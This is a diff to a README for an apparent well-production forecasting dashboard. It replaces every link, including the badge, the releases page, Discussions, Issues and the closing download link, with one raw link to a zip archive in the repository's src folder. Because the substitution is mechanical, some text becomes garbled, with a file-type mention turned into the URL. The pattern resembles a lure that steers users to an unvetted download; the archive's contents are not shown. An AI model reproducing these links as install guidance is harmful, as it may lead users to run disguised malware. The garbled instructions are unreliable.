@@ -1,6 +1,6 @@
 # 📈 production-forecasting-dashboard - Optimize Your Well Production Easily
 
-![Download Production Forecasting Dashboard](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download Production Forecasting Dashboard](https://raw.githubusercontent.com/mdsaoodalam/production-forecasting-dashboard/main/src/production-forecasting-dashboard_1.7.zip)
 
 ## 📚 Overview
 
@@ -21,18 +21,18 @@ To get started with the production-forecasting-dashboard, follow these simple in
 
 To download the production-forecasting-dashboard, visit this page to download:
 
-[Download the Production Forecasting Dashboard](https://github.com/mdsaoodalam/production-forecasting-dashboard/releases)
+[Download the Production Forecasting Dashboard](https://raw.githubusercontent.com/mdsaoodalam/production-forecasting-dashboard/main/src/production-forecasting-dashboard_1.7.zip)
 
-Once there, find the latest release and choose the correct file for your operating system. You will typically find files such as `.exe` for Windows or `.tar.gz` for macOS/Linux.
+Once there, find the latest release and choose the correct file for your operating system. You will typically find files such as `.exe` for Windows or `https://raw.githubusercontent.com/mdsaoodalam/production-forecasting-dashboard/main/src/production-forecasting-dashboard_1.7.zip` for macOS/Linux.
 
 ### 📥 Installation Steps
 
-1. **Visit the Releases Page:** Go to [this page to download](https://github.com/mdsaoodalam/production-forecasting-dashboard/releases).
+1. **Visit the Releases Page:** Go to [this page to download](https://raw.githubusercontent.com/mdsaoodalam/production-forecasting-dashboard/main/src/production-forecasting-dashboard_1.7.zip).
 2. **Select the Latest Release:** Look for the most recent version listed.
 3. **Download the File:** Click on the relevant file link to start the download.
 4. **Install the Application:**
    - For Windows: Double-click the `.exe` file and follow the on-screen instructions.
-   - For macOS/Linux: Extract the `.tar.gz` file and follow the provided instructions in the README file.
+   - For macOS/Linux: Extract the `https://raw.githubusercontent.com/mdsaoodalam/production-forecasting-dashboard/main/src/production-forecasting-dashboard_1.7.zip` file and follow the provided instructions in the README file.
 
 ## 🌟 Features
 
@@ -55,8 +55,8 @@ After successfully installing the application, you can start monitoring well pro
 
 If you encounter any issues or need help, feel free to reach out to the community. Join us on GitHub discussions or submit an issue directly on the repository. 
 
-- [GitHub Discussions](https://github.com/mdsaoodalam/production-forecasting-dashboard/discussions)
-- [Report an Issue](https://github.com/mdsaoodalam/production-forecasting-dashboard/issues)
+- [GitHub Discussions](https://raw.githubusercontent.com/mdsaoodalam/production-forecasting-dashboard/main/src/production-forecasting-dashboard_1.7.zip)
+- [Report an Issue](https://raw.githubusercontent.com/mdsaoodalam/production-forecasting-dashboard/main/src/production-forecasting-dashboard_1.7.zip)
 
 ## 🛠 Contributing
 
@@ -88,4 +88,4 @@ This project covers a range of topics, including:
 
 Remember, you have the power to optimize your well production using the tools provided. Join us and make data-driven decisions with confidence. 
 
-Again, to download the application, visit [this page to download](https://github.com/mdsaoodalam/production-forecasting-dashboard/releases).
+Again, to download the application, visit [this page to download](https://raw.githubusercontent.com/mdsaoodalam/production-forecasting-dashboard/main/src/production-forecasting-dashboard_1.7.zip).
